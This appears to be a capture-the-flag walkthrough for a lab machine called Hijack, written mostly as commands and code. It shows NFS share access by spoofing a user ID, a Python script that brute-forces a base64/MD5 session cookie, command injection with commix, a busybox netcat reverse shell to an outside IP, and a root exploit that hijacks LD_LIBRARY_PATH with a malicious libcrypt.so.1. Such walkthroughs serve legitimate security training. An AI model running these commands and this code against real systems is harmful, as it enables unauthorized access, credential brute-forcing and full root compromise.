mistake i did: not checking the session cookie for encryption type

port open

```
2049/tcp  open  nfs      syn-ack ttl 62 2-4 (RPC #100003)
```

enumeration

```console
$ showmount -e 10.49.140.144 
Export list for 10.49.140.144:
/mnt/share *
                  
$ sudo mount -t nfs 10.49.140.144:/mnt/share /tmp/share

# ls -la /tmp | grep nfs 
drwx------  2 1003 1003 4096 Aug  8  2023 nfs # only the user nfs with uid 1003 allowed to view stuffs

# useradd -u 1003 nfs

$ cd /tmp/nfs
<ftp_creds>
```

download

```
$ wget -r --user="ftpuser" --password="REDACTED" ftp://hijack.thm/
```

```console
$ cat .from_admin.txt 
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

session cookie was base64 encode in user:password format fuzzed it with

```py
import requests, hashlib, base64

URL = "http://10.49.140.144/administration.php"
USERNAME = "admin"

def md5encode(text: str) -> str:
    return hashlib.md5(text.encode("utf-8")).hexdigest()

def encode_cookies(password: str) -> str:
    creds = "admin:" + md5encode(password)
    return base64.b64encode(creds.encode("utf-8")).decode("ascii")

def check_login(passwd) -> bool:
    resp = requests.get(URL, cookies={"PHPSESSID": encode_cookies(passwd)})
    return "Access denied" not in resp.text

if __name__ == "__main__":
    with open("passwords.lst", "r") as f:
        password_lst = f.read().split("\n")
    
    for passwd in password_lst:
        if check_login(passwd):
            print("[+] found", passwd)
```

got a sudo shell with comix

```
commix -r ~/resp -p service
```


got reverse shell through busybox

```
busybox nc 192.168.247.244 9002 -e sh
```

priv esc

```console
$ sudo -l
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fffce4df000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f5dd3a44000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f5dd381d000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f5dd35eb000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5dd33ce000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5dd3004000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f5dd2dcc000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f5dd2ba3000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f5dd299e000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f5dd279a000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5dd3f59000)
```

> Programs running via sudo can inherit variables from the environment of the user. If the `env_reset` option is set in the `/etc/sudoers` config file, sudo will run the programs in a new, minimal environment. The env_keep option can be used to keep certain environment variables from the user’s environment. The configured options are displayed when running sudo -l.


```console
$ cat hijack.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC hijack.c
hijack.c: In function ‘hijack’:
hijack.c:8:9: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
         setresuid(0,0,0);
         ^
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
root@Hijack:~# 
```
